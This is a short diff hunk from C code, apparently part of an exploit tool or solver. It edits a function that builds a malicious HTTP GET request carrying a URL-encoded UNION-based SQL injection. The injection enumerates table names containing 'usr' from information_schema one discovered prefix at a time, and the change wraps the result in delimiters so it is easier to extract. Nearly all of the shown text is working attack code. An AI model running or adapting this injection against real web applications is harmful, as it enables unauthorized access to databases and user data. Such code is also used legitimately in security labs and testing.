@@ -232,7 +232,7 @@ bool check_table(const void *ctx) {
     char mal_req[4096];
 
     const char *fmt =
-        "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20"
+        "GET /index.php?order_id=0%%20UNION%%20SELECT%%20CONCAT%%28%%22%%3C%%22%%2Ctable_name%%2C%%22%%3C%%22%%29%%20"
         "FROM%%20information_schema.TABLES%%20"
         "WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20"
         "AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
